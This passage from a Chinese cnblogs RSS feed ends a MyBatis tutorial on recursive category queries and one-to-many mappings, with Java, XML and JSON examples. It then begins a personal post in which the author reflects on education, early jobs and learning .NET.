&lt;span&gt;insert&lt;/span&gt;  &lt;span&gt;into&lt;/span&gt; `goods_category`(`goodscateid`,`name`,`parentid`,`description`,`displayorder`,`commissionrate`,`enabled`) &lt;span&gt;values&lt;/span&gt; (&lt;span&gt;1&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;java&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;0&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;111&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;),(&lt;span&gt;2&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;spring&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;1&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;222&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;),(&lt;span&gt;3&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;springmvc&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;1&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;333&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;),(&lt;span&gt;4&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;struts&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;1&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;444&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;),(&lt;span&gt;5&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;jdbc&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;0&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;555&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;),(&lt;span&gt;6&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;hibernate&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;5&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;666&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;),(&lt;span&gt;7&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;mybatis&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;5&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;777&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;),(&lt;span&gt;8&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;jdbctemplate&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;5&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;888&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;),(&lt;span&gt;9&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;beanfactory&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;3&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;999&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;),(&lt;span&gt;10&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;factorybean&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;3&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;000&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;,&lt;span&gt;NULL&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 实体类&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
@JsonIgnoreProperties({&quot;displayorder&quot;,&quot;commissionrate&quot;,&quot;enabled&quot;&lt;span&gt;})
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; GoodsCategoryVo {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Integer goodscateid;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String name;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Integer parentid;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String description;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Integer displayorder;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Double commissionrate;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Integer enabled;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; List&amp;lt;GoodsCategoryVo&amp;gt;&lt;span&gt; catelist;
get 。。。 set。。。 tostring。。。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;dao层&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; GoodsMapper {
    List&lt;/span&gt;&amp;lt;GoodsCategoryVo&amp;gt;&lt;span&gt; getCategory(Integer pid);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;mapper.xml&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;resultMap id&lt;span&gt;=&lt;/span&gt;&quot;getSelf&quot; type&lt;span&gt;=&lt;/span&gt;&quot;com.bscc.beans.GoodsCategoryVo&quot;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;id &lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&quot;goodscateid&quot; property&lt;span&gt;=&lt;/span&gt;&quot;goodscateid&quot;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;id&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;result &lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&quot;name&quot; property&lt;span&gt;=&lt;/span&gt;&quot;name&quot;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;result&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;collection property&lt;span&gt;=&lt;/span&gt;&quot;catelist&quot; &lt;span&gt;select&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;getCategory&quot;
            &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&quot;goodscateid&quot;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;collection&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;!&lt;span&gt;--&lt;/span&gt;&lt;span&gt;查到的cid作为下次的pid --&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;resultMap&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select&lt;/span&gt; id&lt;span&gt;=&lt;/span&gt;&quot;getCategory&quot; resultMap&lt;span&gt;=&lt;/span&gt;&quot;getSelf&quot;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; goods_category &lt;span&gt;where&lt;/span&gt;  parentid&lt;span&gt;=&lt;/span&gt;&lt;span&gt;#{pid}
        &lt;/span&gt;&lt;span&gt;ORDER&lt;/span&gt; &lt;span&gt;BY&lt;/span&gt;&lt;span&gt; displayorder,goodscateid
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;之后直接访问对应的方法，即可查询出来&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
@RequestMapping(&quot;/getGoodsList&quot;&lt;span&gt;)
    @ResponseBody
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;GoodsCategoryVo&amp;gt;&lt;span&gt; getGoodsList(){
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; pid指定为0&lt;/span&gt;
        List&amp;lt;GoodsCategoryVo&amp;gt; list = goodsMapper.getCategory(0&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; list;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;结果，可以使用&lt;a href=&quot;https://www.sojson.com/&quot; target=&quot;_blank&quot;&gt;json在线工具&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;81&quot;&gt;
&lt;pre&gt;
&lt;span&gt;[
    {
        &lt;/span&gt;&quot;goodscateid&quot;: 1&lt;span&gt;,
        &lt;/span&gt;&quot;name&quot;: &quot;java&quot;&lt;span&gt;,
        &lt;/span&gt;&quot;parentid&quot;: 0&lt;span&gt;,
        &lt;/span&gt;&quot;description&quot;: &quot;111&quot;&lt;span&gt;,
        &lt;/span&gt;&quot;catelist&quot;&lt;span&gt;: [
            {
                &lt;/span&gt;&quot;goodscateid&quot;: 2&lt;span&gt;,
                &lt;/span&gt;&quot;name&quot;: &quot;spring&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;parentid&quot;: 1&lt;span&gt;,
                &lt;/span&gt;&quot;description&quot;: &quot;222&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;catelist&quot;&lt;span&gt;: []
            },
            {
                &lt;/span&gt;&quot;goodscateid&quot;: 3&lt;span&gt;,
                &lt;/span&gt;&quot;name&quot;: &quot;springmvc&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;parentid&quot;: 1&lt;span&gt;,
                &lt;/span&gt;&quot;description&quot;: &quot;333&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;catelist&quot;&lt;span&gt;: [
                    {
                        &lt;/span&gt;&quot;goodscateid&quot;: 9&lt;span&gt;,
                        &lt;/span&gt;&quot;name&quot;: &quot;beanfactory&quot;&lt;span&gt;,
                        &lt;/span&gt;&quot;parentid&quot;: 3&lt;span&gt;,
                        &lt;/span&gt;&quot;description&quot;: &quot;999&quot;&lt;span&gt;,
                        &lt;/span&gt;&quot;catelist&quot;&lt;span&gt;: []
                    },
                    {
                        &lt;/span&gt;&quot;goodscateid&quot;: 10&lt;span&gt;,
                        &lt;/span&gt;&quot;name&quot;: &quot;factorybean&quot;&lt;span&gt;,
                        &lt;/span&gt;&quot;parentid&quot;: 3&lt;span&gt;,
                        &lt;/span&gt;&quot;description&quot;: &quot;000&quot;&lt;span&gt;,
                        &lt;/span&gt;&quot;catelist&quot;&lt;span&gt;: []
                    }
                ]
            },
            {
                &lt;/span&gt;&quot;goodscateid&quot;: 4&lt;span&gt;,
                &lt;/span&gt;&quot;name&quot;: &quot;struts&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;parentid&quot;: 1&lt;span&gt;,
                &lt;/span&gt;&quot;description&quot;: &quot;444&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;catelist&quot;&lt;span&gt;: []
            }
        ]
    },
    {
        &lt;/span&gt;&quot;goodscateid&quot;: 5&lt;span&gt;,
        &lt;/span&gt;&quot;name&quot;: &quot;jdbc&quot;&lt;span&gt;,
        &lt;/span&gt;&quot;parentid&quot;: 0&lt;span&gt;,
        &lt;/span&gt;&quot;description&quot;: &quot;555&quot;&lt;span&gt;,
        &lt;/span&gt;&quot;catelist&quot;&lt;span&gt;: [
            {
                &lt;/span&gt;&quot;goodscateid&quot;: 6&lt;span&gt;,
                &lt;/span&gt;&quot;name&quot;: &quot;hibernate&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;parentid&quot;: 5&lt;span&gt;,
                &lt;/span&gt;&quot;description&quot;: &quot;666&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;catelist&quot;&lt;span&gt;: []
            },
            {
                &lt;/span&gt;&quot;goodscateid&quot;: 7&lt;span&gt;,
                &lt;/span&gt;&quot;name&quot;: &quot;mybatis&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;parentid&quot;: 5&lt;span&gt;,
                &lt;/span&gt;&quot;description&quot;: &quot;777&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;catelist&quot;&lt;span&gt;: []
            },
            {
                &lt;/span&gt;&quot;goodscateid&quot;: 8&lt;span&gt;,
                &lt;/span&gt;&quot;name&quot;: &quot;jdbctemplate&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;parentid&quot;: 5&lt;span&gt;,
                &lt;/span&gt;&quot;description&quot;: &quot;888&quot;&lt;span&gt;,
                &lt;/span&gt;&quot;catelist&quot;&lt;span&gt;: []
            }
        ]
    }
]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;mybatis递归就是这么的简单。&lt;/p&gt;

&lt;p&gt;说下mybatis一对多实现&lt;/p&gt;
&lt;p&gt;对应的bean&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Dept {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Integer id;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String deptName;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String locAdd;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; List&amp;lt;Emp&amp;gt; emps
&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
@JsonIgnoreProperties(&quot;dept&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Emp {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Integer id;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String name;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; Dept dept;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;dao层&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; DeptMapper {
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Dept getDeptById(Integer id);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; EmpMapper {
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Emp getEmpByDeptId(Integer deptId); 
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;mapper.xml文件&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mapper &lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt;=&quot;com.bscc.mapper.DeptMapper&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
 &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;resultMap &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;DeptResultMap&quot;&lt;/span&gt;&lt;span&gt; type&lt;/span&gt;&lt;span&gt;=&quot;com.bscc.beans.Dept&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
   &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;id &lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;=&quot;id&quot;&lt;/span&gt;&lt;span&gt; column&lt;/span&gt;&lt;span&gt;=&quot;id&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
   &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;=&quot;deptName&quot;&lt;/span&gt;&lt;span&gt; column&lt;/span&gt;&lt;span&gt;=&quot;deptName&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
   &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;=&quot;locAdd&quot;&lt;/span&gt;&lt;span&gt; column&lt;/span&gt;&lt;span&gt;=&quot;locAdd&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
   &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; private List&amp;lt;Emp&amp;gt; emps; column=&quot;id&quot;写被集合对象主键，select按照外键键查询，通过deptid查出emp给dept&lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;   
   &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;collection &lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;=&quot;emps&quot;&lt;/span&gt;&lt;span&gt; column&lt;/span&gt;&lt;span&gt;=&quot;id&quot;&lt;/span&gt;&lt;span&gt; ofType&lt;/span&gt;&lt;span&gt;=&quot;Emp&quot;&lt;/span&gt;&lt;span&gt; select&lt;/span&gt;&lt;span&gt;=&quot;com.bscc.mapper.EmpMapper.getEmpByDeptId&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
 &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;resultMap&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
 &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;getDeptById&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;Integer&quot;&lt;/span&gt;&lt;span&gt; resultMap&lt;/span&gt;&lt;span&gt;=&quot;DeptResultMap&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        select * from tbl_dept where id=#{id}
 &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;mapper&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mapper &lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt;=&quot;com.bscc.mapper.EmpMapper&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
 &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;resultMap  &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;EmpResultMap&quot;&lt;/span&gt;&lt;span&gt; type&lt;/span&gt;&lt;span&gt;=&quot;com.bscc.beans.Emp&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
   &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;id &lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;=&quot;id&quot;&lt;/span&gt;&lt;span&gt; column&lt;/span&gt;&lt;span&gt;=&quot;id&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
   &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;=&quot;name&quot;&lt;/span&gt;&lt;span&gt; column&lt;/span&gt;&lt;span&gt;=&quot;name&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
 &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;resultMap&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
 &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;getEmpByDeptId&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;Integer&quot;&lt;/span&gt;&lt;span&gt; resultMap&lt;/span&gt;&lt;span&gt;=&quot;EmpResultMap&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
   select * from tbl_emp where deptId=#{deptId}
 &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;mapper&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;对应的controller方法&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
@RequestMapping(&quot;/getDeptById&quot;&lt;span&gt;)
    @ResponseBody
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Dept getDeptById() {
        Dept deptById &lt;/span&gt;= deptMapper.getDeptById(1&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; deptById;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;无非就是比简单查询复杂一些罢了。&lt;/p&gt;
&lt;p&gt;代码目录&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1158451/201808/1158451-20180806225548878-78371061.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;OK！！！&lt;/p&gt;
&lt;p&gt; 对应的github地址&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/chywx/MavenProject6oneToMany&quot; target=&quot;_blank&quot;&gt;https://github.com/chywx/MavenProject6oneToMany&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 06 Aug 2018 15:05:00 +0000</pubDate>
<dc:creator>陈灬大灬海</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/c-h-y/p/9434126.html</dc:identifier>
</item>
<item>
<title>2018年8月6日博客之旅真正开始 - 炎寒</title>
<link>http://www.cnblogs.com/xiayongming/p/9434054.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiayongming/p/9434054.html</guid>
<description>&lt;p&gt;&lt;span&gt;　&lt;strong&gt;恒，厚，勤，学，俭&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;&lt;strong&gt;怕什么真理无穷，进一寸有进一寸的欢喜！&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;      &lt;span&gt;这篇文章写给自己！这篇文章写给自己！这篇文章写给自己！这篇文章写给自己！&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;      以前总是在写的时候越写越纠结，考虑怎么让看得人理解，怎么让看的人明白，怎么让自己装一波逼。这篇文章写给自己，从现在开始，开始自己的博客之旅。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;一、自己的小总结——教育、工作（流水账）：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;　 1）教育：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　2010年高中毕业就开始工作，至今有8年了，从刚毕业到现在心理变化很大，知识确实是十分重要的，不是美丽人生的敲门砖，也不是进步的阶梯，没有这些高大上的说法；我真心的认为，知识改变你对这个世界的认知，知识让你可以追求你想要的，理解你想知道的。工作时间越久越是能感到这条陌生人看来不明显的残腿对我人生征途的限制。限制不在于找工作与物质，在于对我人格发展、知识追求的限制。开篇写这些希望未来感觉不想学习、不想接触新东西的自己能重新找回一个谦虚爱学的自己。&lt;/p&gt;
&lt;p&gt;       另外，也提一个疯狂的想法，为什么一定就要是数理化史地生语文英语，数学、语文、英语、体育必修没有问题，可是物理、化学、历史、生物、政治这些，是否必须要像古诗一样背诵，一定要像数学一样背公式，是否应该追求的是意识层面上的理解而不是求某一个方程的解？背过元素周期表是否真的有意义。我不聪明也不笨，若是有人能告诉我为什么而学习\如何去真正的学习让我找到背书、背题、刷题的意义，若是家庭关系没有那么多的事情，或许我也会考个还算不错的大学，找到一份还算不错的工作吧。中考是相对公平的，是突破阶级屏障的一个非常明晰和正确的路线；但，这个公平若只是说“最后大家都是通过分数检测是否合格”这就最不合理的，出身不只影响一个人的生活基础、物质基础，还影响一个人的性格、情绪，有了这些作为底层基础，才有后续的发展、性格、培养这些上层建筑。都说寒门出贵子，这个“贵”也是“寒”比出来的罢，起始豪门的贵子多了去了，如果统计出来比例肯定也更高。说一千道一万，现在我也是个父亲了，拼命工作，为我的孩子找一个人数尽量少的班级，让老师可以把更多的精力放在因材施教上；让我的孩子尽早接触那些更高级、更新颖的东西，哪怕很贵很难，哪怕他现在并不会，只要他感兴趣我就想培养他，孩子越小的时候对这个世界的认知越重要，这些认知潜移默化的影响他以后的人生道路，我更不想让他以后跟他爸一样，上学买个橡皮泥都会很头痛。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;　&lt;span&gt;　2）工作：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　工作8年，前一年在一家日企中国合作公司实习，做数据筛查和梳理，做了时间不长。一是那时候很年轻，对工作没有概念；二是也受不了日企的工作氛围（上班不能说中文，早晨7.30到，早晨早会，晚上晚会，每天报日清到每15分钟）；后来离职了。&lt;/p&gt;
&lt;p&gt;　    紧接着找了个培训学校学习.NET。（原因是本身自己对计算机感兴趣，从小喜欢研究些乱七八糟的东西，初三的时候开始“玩”灰鸽子啊（真的是玩，只是用工具）、上兴啊、加花加壳啊，过免杀啊这些，没有什么实在的技术但对计算机整体认识提升了不少。）&lt;/p&gt;
&lt;p&gt;　　学费4700，四个月，全日制加周六，早九晚八，那阵子学习的很刻苦，也算是从一群大专学生中“脱颖而出”？这个时候是第一次有一种感觉，学历不是最重要的，因为我看到太多人交了学费在玩着上学，然后毕业找不到工作回老家去的，我其实这时候感觉自己底子不算差。&lt;/p&gt;
&lt;p&gt;　　四个月后，去了三家公司面试，都收到了offer，选了一家规模大、工资相对高的（11年，多300块钱？税前2800？）。印象最深的是其他家都是面试官问问题，唯独我选的这家公司面试有卷子，让写快速排序和冒泡排序，现在回想起来就想笑，我写出来了，而且连大括号、类名、引用、注释都用笔写上了。现在自己也面试了不少别人，也出过类似的问题，相比之下，当年我写的答卷的仔细程度可能就是这家公司收留我一个中专文凭的弱鸡的原因吧？？&lt;/p&gt;
&lt;p&gt;   　入职以后懵逼状态，团队12人，平均年龄30岁，很不适应，加上维护一个零几年的老系统，有一次年终奖只发了167块？最后离职了。&lt;/p&gt;
